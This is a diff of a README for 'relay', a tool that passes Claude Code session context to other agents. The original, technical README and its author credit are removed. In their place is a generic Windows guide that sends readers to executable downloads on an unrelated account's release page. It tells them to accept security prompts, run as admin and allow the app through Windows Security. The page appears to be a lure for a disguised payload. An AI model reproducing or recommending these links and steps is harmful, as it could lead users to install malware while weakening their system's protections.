@@ -1,486 +1,206 @@
-# Relay
+# 🔁 relay - Keep work moving across agents
 
-**When Claude Code hits its rate limit, another agent picks up exactly where you left off.**
+[Download relay for Windows](https://github.com/plundering-jackass936/relay/releases)  
+[![Download relay](https://img.shields.io/badge/Download%20relay-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/plundering-jackass936/relay/releases)
 
-[![CI](https://github.com/Manavarya09/relay/actions/workflows/ci.yml/badge.svg)](https://github.com/Manavarya09/relay/actions)
-[![npm](https://img.shields.io/npm/v/relay-dev)](https://www.npmjs.com/package/relay-dev)
-[![Rust](https://img.shields.io/badge/Rust-1.70+-orange.svg)](https://www.rust-lang.org/)
-[![GitHub Release](https://img.shields.io/github/v/release/Manavarya09/relay)](https://github.com/Manavarya09/relay/releases)
-[![Tests](https://img.shields.io/badge/tests-62_passing-brightgreen.svg)](https://github.com/Manavarya09/relay/actions)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+## 🧭 What relay does
 
+relay helps you keep working when Claude Code hits a rate limit. It takes your full session context and hands it off to another agent, such as Codex, Gemini, Aider, or other supported tools.
 
-<p align="center">
-  <img src="assets/promo.gif" alt="Relay launch promo" width="100%"/>
-</p>
+That means you do not need to start over. Your prompt history, task state, and working notes stay with the next agent, so you can keep the same thread of work going.
 
----
+## 🪟 What you need on Windows
 
-## Install
+Before you install relay, make sure your PC has:
 
-```bash
-# npm (auto-downloads pre-built binary)
-npm install -g relay-dev
+- Windows 10 or Windows 11
+- An internet connection
+- Permission to run apps on your computer
+- At least 200 MB of free disk space
+- Access to Claude Code and at least one supported agent if you plan to use handoff
 
-# or run directly without installing
-npx relay-dev handoff --to codex
+If you are not sure which file to use, choose the Windows release file that ends in `.exe` or `.msi`.
 
-# or build from source
-git clone https://github.com/Manavarya09/relay
-cd relay && ./scripts/build.sh
-ln -sf $(pwd)/core/target/release/relay ~/.cargo/bin/relay
-```
+## 📥 Download relay
 
-After install, set up your config:
+Visit this page to download relay for Windows:
 
-```bash
-relay init          # generate ~/.relay/config.toml
-relay validate      # test agent connectivity
-relay agents        # see what's available
-```
+[https://github.com/plundering-jackass936/relay/releases](https://github.com/plundering-jackass936/relay/releases)
 
----
+On the release page:
 
-## The Problem
+1. Open the latest release
+2. Find the Windows file under Assets
+3. Download the file that matches your system
+4. Save it to a folder you can find again, such as Downloads
 
-You're 45 minutes into a Claude Code session. Debugging, editing files, running tests. Claude has full context on everything. Then:
+## ⚙️ Install relay
 
-```
-Error: Rate limit reached. Your request has been throttled.
-```
+If the release gives you an `.exe` or `.msi` file:
 
-All that context is gone. You open Codex or Gemini and spend 20 minutes re-explaining everything from scratch.
+1. Open the file after it finishes downloading
+2. If Windows shows a security prompt, choose Run or Yes
+3. Follow the setup steps on screen
+4. Finish the install
+5. Open relay from the Start menu or the folder where you saved it
 
-## The Solution
+If the release gives you a `.zip` file:
 
-```bash
-relay handoff --to codex
-```
+1. Right-click the file
+2. Choose Extract All
+3. Open the extracted folder
+4. Find the relay app file
+5. Double-click it to start
 
-Relay reads Claude's actual `.jsonl` session transcript -- every conversation turn, tool call, file edit, error, decision -- compresses it with relevance-based scoring, scans for leaked secrets, estimates the API cost, and launches the fallback agent with complete context.
+## 🚀 First run
 
-If that agent fails, it automatically chains to the next one in your priority list.
+When you open relay for the first time:
 
-Or just run the daemon and never think about it:
+1. Sign in to your Claude Code account if needed
+2. Pick the agent you want to hand work to
+3. Check that your API keys or agent links are set up
+4. Run a small test handoff
+5. Confirm that the next agent receives the same context
 
-```bash
-relay watch
-```
+A simple test is best. Start with a short task, then move to a real one after you see it work.
 
-Zero intervention. Relay monitors your session, detects the rate limit, and hands off automatically.
+## 🔄 How agent handoff works
 
----
+relay follows a simple flow:
 
-## How It Works
+1. You work in Claude Code
+2. Claude Code reaches a rate limit or you want to switch
+3. relay gathers your current context
+4. relay sends that context to another agent
+5. You keep working without rebuilding the whole thread
 
-<p align="center">
-  <img src="assets/demo.gif" alt="Relay workflow demo" width="100%"/>
-</p>
+This helps when your task has:
 
-<br/>
+- A long chat history
+- Code notes you do not want to repeat
+- File names or paths you need to keep
+- Steps that depend on earlier messages
+- A task that needs a second model or tool
 
-1. **Reads** `~/.claude/projects/<project>/<session>.jsonl` -- Claude's actual session transcript
-2. **Extracts** conversation turns, tool calls with results, errors, decisions, TodoWrite state
-3. **Captures** git branch, diff summary, uncommitted files, recent commits
-4. **Scores** each context section by relevance using the scoring engine -- task (100), error (95), recent conversation (85), git (80), decisions (70+), todos (50+), files (30)
-5. **Compresses** using score-driven budget allocation -- highest-scoring sections kept, lowest dropped first
-6. **Scans** for API keys, tokens, passwords, private keys before sending
-7. **Estimates** token count and cost for API agents
-8. **Chains** through agents in priority order until one succeeds
-9. **Records** the result in a local SQLite database for analytics
+## 🛠️ Supported agents
 
----
+relay can hand off to several agents, including:
 
-## What Gets Captured
+- Codex
+- Gemini
+- Aider
+- Other supported CLI agents
 
-This is not just git state. Relay reads the actual Claude transcript:
+Each agent has its own setup. Some use an API key. Some use a local command line tool. Some use a connected account. Set up the one you want before you start.
 
-```
-  manav@mbp ~/myproject $ relay status
+## 🧩 Basic setup tips
 
-  Session Snapshot
-  ══════════════════════════════════════════════════
+To get better handoffs, keep these habits:
 
-  /Users/dev/myproject
-  2026-04-10 14:46
+- Write short, clear task notes
+- Keep file names exact
+- Mention what has already been tried
+- Save the main goal in one place
+- Use the same project folder when possible
 
-  Current Task
-  ──────────────────────────────────────────────────
-  Fix the JWT validation in auth middleware
+Good context makes the next agent more useful. If the task has steps, list them in order before you hand it off.
 
-  Progress
-  ──────────────────────────────────────────────────
-  [done]        Database schema + REST API
-  [done]        Landing page overhaul
-  [IN PROGRESS] Auth middleware
-  [pending]     Frontend dashboard
+## 🔐 Accounts and keys
 
-  Last Error
-  ──────────────────────────────────────────────────
-  error[E0499]: cannot borrow `state` as mutable more than once
+Some agent setups need a key or sign-in. If relay asks for one, use the one from the service you picked.
 
-  Key Decisions
-  ──────────────────────────────────────────────────
-  - Using JWT instead of session cookies
-  - Redis for token blacklist
+Typical items you may need:
 
-  Conversation (25 turns)
-  ──────────────────────────────────────────────────
-  AI   Now update the route handlers to use the new middleware.
-  TOOL [Edit] src/middleware/auth.rs (replacing 234 chars)
-  OUT  File updated successfully.
-  TOOL [Bash] cargo test -- auth
-  OUT  test result: ok. 6 passed; 0 failed
-```
+- Claude Code access
+- A Codex account or key
+- A Gemini account or key
+- An Aider setup
+- A local shell or terminal path
 
-The fallback agent gets everything. No re-explaining.
+If you do not plan to use a certain agent, you do not need to set it up.
 
----
+## 🧪 Common uses
 
-## Quick Start
+relay works well for tasks like:
 
-```bash
-# Interactive agent picker
-relay handoff
+- Switching from Claude Code after rate limits
+- Moving a coding job to a second agent
+- Keeping a long task moving across tools
+- Saving time on repeated setup
+- Testing which agent gives the best result for a job
 
-# Specific agent
-relay handoff --to codex
+It is most useful when you already have useful context and do not want to rebuild it by hand.
 
-# With deadline urgency
-relay handoff --to codex --deadline "7:00 PM"
+## 🧱 Troubleshooting
 
-# Minimal context (just task + error + git)
-relay handoff --template minimal --to codex
+If relay does not start:
 
-# Copy to clipboard instead of launching
-relay handoff --clipboard
+1. Check that the file finished downloading
+2. Make sure Windows did not block the app
+3. Try running it as an admin
+4. Check that you downloaded the correct Windows file
+5. Reboot your PC and try again
 
-# Dry run -- see what gets sent
-relay handoff --dry-run
+If handoff does not work:
 
-# Daemon mode -- auto-detects and hands off
-relay watch
+1. Check your internet connection
+2. Make sure the target agent is set up
+3. Confirm that your account is signed in
+4. Check for missing keys or tokens
+5. Try a smaller test task
 
-# Target a specific session (useful with multiple terminals)
-relay sessions                            # list all active sessions
-relay handoff --session abc123 --to codex # handoff a specific session
+If the app opens but shows no context:
 
-# Disable chain fallback (only try the named agent)
-relay handoff --to codex --no-chain
-```
+1. Confirm you are in the right project folder
+2. Check that your session data is saved
+3. Make sure the source agent has work to hand off
+4. Retry the handoff from a fresh session
 
----
+## 🖥️ Windows notes
 
-## Agents
+On Windows, relay may work best when you:
 
-8 built-in adapters plus a plugin system for custom agents.
+- Keep the app in a stable folder like Program Files or Downloads
+- Avoid moving the app file after install
+- Run it from the same user account each time
+- Allow it through Windows Security if asked
+- Keep your terminal open if you use CLI agents
 
-| Agent | Type | Launch Method |
-|-------|------|---------------|
-| Codex | CLI (OpenAI) | Opens interactive TUI with context |
-| Claude | CLI (Anthropic) | New Claude session with handoff |
-| Aider | CLI (open source) | Opens with `--message` handoff |
-| Gemini | API / CLI | CLI or REST API with retry |
-| Copilot | CLI (GitHub) | Opens with context |
-| OpenCode | CLI (Go) | Opens with context |
-| Ollama | Local API | REST call to local model with retry |
-| OpenAI | API | Chat completions API with retry |
-| Plugins | Custom | Your own agents via TOML + shell script |
+If your company laptop has limits on app installs, you may need help from your system admin.
 
-### Handoff Chains
+## 📁 Recommended workflow
 
-If the first agent fails, Relay cascades to the next:
+A simple work flow looks like this:
 
-```
-  [1] Trying codex... not available
-  [2] Trying gemini... API error (429)
-  [3] Trying ollama... done
-       Handed off to ollama
-```
+1. Open Claude Code and do the first part of the job
+2. Save the task details
+3. Open relay when you hit a limit
+4. Choose the next agent
+5. Hand off the full context
+6. Keep working in the new tool
 
-This also works when using `--to`:
+This works best when you treat relay as part of the same work session, not as a separate step
 
-```bash
-relay handoff --to codex   # if codex fails, cascades to next agent
-relay handoff --to codex --no-chain   # strict: only try codex
-```
+## 🧭 Example handoff
 
-Works in daemon mode too. Complete resilience.
+You might use relay like this:
 
----
+- You ask Claude Code to inspect a bug
+- Claude Code gives you part of the fix
+- You hit a rate limit before the full change is done
+- relay passes the bug details, file list, and next steps to Gemini
+- Gemini finishes the job with the same context
 
-## Plugin System
+The goal is to stop rework and keep momentum
 
-Create custom agents without writing Rust:
+## 📌 Release page
 
-```bash
-relay plugin-new my-agent
-```
+Use this page to get the latest Windows build:
 
-Creates `~/.relay/plugins/my-agent/`:
+[https://github.com/plundering-jackass936/relay/releases](https://github.com/plundering-jackass936/relay/releases)
 
-```
-plugin.toml     -- metadata and config
-handoff.sh      -- your agent logic (receives handoff on stdin)
-```
+If a new version comes out later, return to the same page and download the newer release
 
-```toml
-[plugin]
-name = "my-agent"
-description = "Custom internal agent"
-version = "0.1.0"
-command = "./handoff.sh"
-```
+## 🏷️ Topics
 
-Plugins are auto-discovered and show up in `relay agents`.
-
----
-
-## Analytics
-
-Every handoff is tracked in a local SQLite database.
-
-```bash
-relay stats
-```
-
-```
-  Relay Analytics
-  ══════════════════════════════════════════════════
-
-  Total handoffs:     47
-  Successful:         43 (91%)
-  Failed:             4
-  Avg duration:       1,250ms
-  Est. time saved:    645 min
-
-  Agent Breakdown
-  ──────────────────────────────────────────────────
-  codex          28 handoffs (27 ok, 1 fail) avg 890ms
-  gemini         12 handoffs (11 ok, 1 fail) avg 2100ms
-  ollama          7 handoffs (5 ok, 2 fail) avg 1800ms
-```
-
----
-
-## Secret Detection
-
-Before sending a handoff, Relay scans for:
-
-- AWS access keys and secret keys
-- OpenAI API keys (`sk-...`)
-- GitHub tokens (`ghp_...`, `gho_...`)
-- Private keys (`-----BEGIN...PRIVATE KEY-----`)
-- Database connection strings
-- Slack tokens, bearer tokens, generic passwords
-
-If detected, the handoff is blocked with a redacted warning. Use `--force` to override.
-
----
-
-## Cost Estimation
-
-For API agents, Relay shows the estimated cost before sending:
-
-```
-  ~2,400 tokens (~$0.006 on gpt-4o)
-```
-
-CLI agents show `(free -- local/CLI agent)`.
-
----
-
-## Context Control
-
-```bash
-# Default: last 25 conversation turns + everything
-relay handoff --to codex
-
-# Light: 10 turns only
-relay handoff --to codex --turns 10
-
-# Only git state + todos
-relay handoff --to codex --include git,todos
-
-# Templates: full (default), minimal, raw
-relay handoff --template minimal --to codex
-
-# Skip secret detection
-relay handoff --to codex --force
-```
-
----
-
-## Multi-Session Support
-
-When running multiple Claude Code sessions across different terminals or projects, use `relay sessions` to pick which one to hand off:
-
-```bash
-relay sessions
-```
-
-```
-  Claude Code Sessions
-  ══════════════════════════════════════════════════
-  ID        Project                   Last Active   Turns
-  a1b2c3d4  ~/myproject               2 min ago     47
-  e5f6g7h8  ~/other-project           15 min ago    12
-  i9j0k1l2  ~/work/backend            1 hour ago    89
-```
-
-```bash
-relay handoff --session a1b2 --to codex
-```
-
-Session IDs support prefix matching -- the first 4-8 characters are usually enough.
-
----
-
-## Daemon Mode
-
-```bash
-relay watch
-relay watch --interval 10 --cooldown 300
-```
-
-The daemon polls Claude's transcript for new content, checks for rate limit signals, captures session state, chains through agents, and records the result. Set it and forget it.
-
----
-
-## All Commands
-
-| Command | Description |
-|---------|-------------|
-| `relay handoff` | Hand off to a fallback agent |
-| `relay watch` | Daemon mode -- auto-detect and hand off |
-| `relay replay` | Re-send a saved handoff to any agent |
-| `relay stats` | Analytics dashboard |
-| `relay status` | Current session snapshot |
-| `relay agents` | List agents and plugins |
-| `relay resume` | Show what the fallback agent did |
-| `relay history` | Past handoffs (json, csv, table) |
-| `relay diff` | Changes since last handoff |
-| `relay validate` | Test agent connectivity |
-| `relay clean` | Remove old handoff files |
-| `relay completions` | Shell completions (bash, zsh, fish) |
-| `relay plugin-new` | Scaffold a custom agent |
-| `relay sessions` | List available Claude Code sessions |
-| `relay init` | Generate default config |
-| `relay hook` | PostToolUse hook for auto-detection |
-
----
-
-## Config
-
-`~/.relay/config.toml`:
-
-```toml
-[general]
-priority = ["codex", "claude", "aider", "gemini", "copilot", "opencode", "ollama", "openai"]
-max_context_tokens = 8000
-auto_handoff = true
-
-[agents.codex]
-model = "o4-mini"
-# binary = "/custom/path/to/codex"  # optional
-
-[agents.claude]
-resume = true                        # use --resume flag (default: true)
-# binary = "/custom/path/to/claude"  # optional
-
-[agents.aider]
-model = "sonnet"                     # default: "sonnet"
-
-[agents.gemini]
-api_key = "your-key"
-model = "gemini-2.5-pro"
-
-[agents.copilot]
-# binary = "/custom/path/to/copilot"  # optional
-
-[agents.opencode]
-# binary = "/custom/path/to/opencode" # optional
-
-[agents.openai]
-api_key = "your-key"
-model = "gpt-4o"
-
-[agents.ollama]
-url = "http://localhost:11434"
-model = "llama3"
-```
-
-All 8 agents are now configurable. Use custom binary paths, models, and API keys.
-
----
-
-## Auto-Handoff Hook
-
-Add to `~/.claude/settings.json`:
-
-```json
-{
-  "hooks": {
-    "PostToolUse": [
-      { "matcher": "*", "hooks": [{ "type": "command", "command": "relay hook" }] }
-    ]
-  }
-}
-```
-
----
-
-## Shell Completions
-
-```bash
-relay completions bash > /etc/bash_completion.d/relay
-relay completions zsh > ~/.zfunc/_relay
-relay completions fish > ~/.config/fish/completions/relay.fish
-```
-
----
-
-## GitHub Action
-
-```yaml
-- uses: masyv/relay-action@v1
-  with:
-    agent: auto
-    gemini-api-key: ${{ secrets.GEMINI_API_KEY }}
-```
-
----
-
-## Architecture
-
-```
-Claude .jsonl --> capture --> score --> compress --> scan secrets --> estimate cost
-                                                         |
-                                                  chain handoff (agent1 --> agent2 --> agent3)
-                                                         |
-                                                  record analytics --> SQLite
-                                                         |
-                                                  relay stats dashboard
-```
-
----
-
-## Performance
-
-| Metric | Value |
-|--------|-------|
-| Binary size | 5 MB |
-| Session capture | < 100ms |
-| Network calls for capture | Zero |
-| Tests | 62 passing |
-| Runtime | Rust, no GC |
-
----
-
-## License
-
-MIT
-
----
-
-Built by [@masyv](https://github.com/Manavarya09)
+agent-handoff, aider, claude-code, cli, codex, context-switching, developer-tools, gemini, llm, rate-limit, rust
